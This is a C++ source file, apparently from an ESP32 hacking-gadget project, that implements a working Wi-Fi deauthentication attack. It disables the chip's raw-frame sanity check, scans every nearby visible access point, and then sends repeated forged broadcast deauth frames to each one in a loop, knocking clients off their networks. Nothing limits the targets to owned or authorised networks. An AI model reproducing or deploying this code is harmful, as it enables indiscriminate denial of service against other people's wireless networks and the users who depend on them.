/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/jbohack/nyanBOX
   ________________________________________ */

#include "../include/deauth.h"
#include "../include/pindefs.h"
#include <stdint.h>
#include <U8g2lib.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

// Function to bypass frame validation (required for raw 802.11 frames)
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}

#define DEBUG false

uint8_t deauth_frame_default[28] = {
    0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00
};

struct AP_Info {
    uint8_t bssid[6];
    int32_t channel;
    int32_t rssi;
};

#define MAX_APS 20
AP_Info ap_list[MAX_APS];
int ap_count = 0;

unsigned long lastDeauthTime = 0;
const unsigned long deauthInterval = 5;
int currentAP = 0;
bool isDeauthing = false;
unsigned long lastStatusUpdate = 0;
const unsigned long statusUpdateInterval = 250;

void printMAC(const uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        if (i > 0 && DEBUG) Serial.print(":");
        if (DEBUG) Serial.printf("%02X", mac[i]);
    }
}

void sendDeauthFrame(uint8_t bssid[6], int channel) {
    if (DEBUG) {
        Serial.print("Sending deauth on channel ");
        Serial.print(channel);
        Serial.print(" to BSSID ");
        printMAC(bssid);
        Serial.println();
    }

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    memcpy(&deauth_frame_default[10], bssid, 6);
    memcpy(&deauth_frame_default[16], bssid, 6);

    for (int i = 0; i < 10; i++) {
        esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
        if (DEBUG && result != ESP_OK) {
            Serial.print("TX failed (code ");
            Serial.print(result);
            Serial.println(")");
        }
    }
}

void performWiFiScan() {
    if (DEBUG) Serial.println("Starting Wi-Fi scan...");
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 10, "Scanning for");
    u8g2.drawStr(0, 25, "WiFi networks...");
    u8g2.sendBuffer();
    
    int n = WiFi.scanNetworks(false, true);
    if (n == 0) {
        if (DEBUG) Serial.println("No networks found.");
        return;
    }

    ap_count = 0;
    for (int i = 0; i < n && ap_count < MAX_APS; i++) {

        if (WiFi.SSID(i).length() == 0) continue; // Skip hidden networks
        
        memcpy(ap_list[ap_count].bssid, WiFi.BSSID(i), 6);
        ap_list[ap_count].channel = WiFi.channel(i);
        ap_list[ap_count].rssi = WiFi.RSSI(i);

        ap_count++;
    }

    WiFi.scanDelete();
}

void deauthSetup() {
    if (DEBUG) Serial.begin(115200);
    
    WiFi.mode(WIFI_AP);
    esp_wifi_set_promiscuous(true);
    delay(1000);

    performWiFiScan();
}

void deauthLoop() {
    unsigned long now = millis();

    if (now - lastStatusUpdate >= statusUpdateInterval) {
        lastStatusUpdate = now;
        
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_ncenB08_tr);
        
        if (ap_count > 0) {
            u8g2.drawStr(0, 10, "Deauthing...");
            char status[32];
            snprintf(status, sizeof(status), "APs: %d  Ch: %d", ap_count, ap_list[currentAP].channel);
            u8g2.drawStr(0, 25, status);
            
            char bssidStr[18];
            snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    ap_list[currentAP].bssid[0], ap_list[currentAP].bssid[1],
                    ap_list[currentAP].bssid[2], ap_list[currentAP].bssid[3],
                    ap_list[currentAP].bssid[4], ap_list[currentAP].bssid[5]);
            u8g2.drawStr(0, 40, bssidStr);
            
            isDeauthing = true;
        } else {
            u8g2.drawStr(0, 10, "No networks found");
            u8g2.drawStr(0, 25, "Press to rescan");
            isDeauthing = false;
        }
        u8g2.sendBuffer();
    }

    if (ap_count > 0 && now - lastDeauthTime >= deauthInterval) {
        lastDeauthTime = now;
        sendDeauthFrame(ap_list[currentAP].bssid, ap_list[currentAP].channel);
        currentAP = (currentAP + 1) % ap_count;
    }
}
